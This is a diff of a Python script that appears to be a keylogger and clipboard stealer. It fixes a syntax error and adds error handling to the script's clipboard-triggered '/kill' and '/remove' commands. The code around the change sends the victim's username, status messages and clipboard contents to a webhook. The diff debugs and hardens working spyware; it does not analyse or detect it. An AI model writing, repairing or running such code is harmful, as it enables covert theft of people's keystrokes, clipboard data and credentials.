@@ -93,6 +93,7 @@ def on_press(key):
 def on_release(key):
     current_clipboard = ""
     current_clipboard = pyperclip.paste()
+
     if "/kill" in current_clipboard:
         send_to_webhook(f"Kill command executed by: {username}")
         file_path = rf"C:\users\{username}\kl2.1"  # Fixed the file path
@@ -100,11 +101,17 @@ def on_release(key):
         time.sleep(1)
         send_to_webhook(f"Opened dir...")
         return False
-    else if: "/remove" in current_clipboard:
+
+    elif "/remove" in current_clipboard:  # Corrected from 'else if' to 'elif'
         send_to_webhook(f"Removed by: {username}")
         file_path = rf"C:\users\{username}\kl2.1"
-        os.rmdir(file_path)
+        try:
+            os.rmdir(file_path)
+            send_to_webhook(f"Directory removed: {file_path}")
+        except OSError as e:
+            send_to_webhook(f"Error removing directory: {e}")
         return False
+
 
 def monitor_clipboard():
     """Monitor the clipboard for changes and send the content to the webhook."""
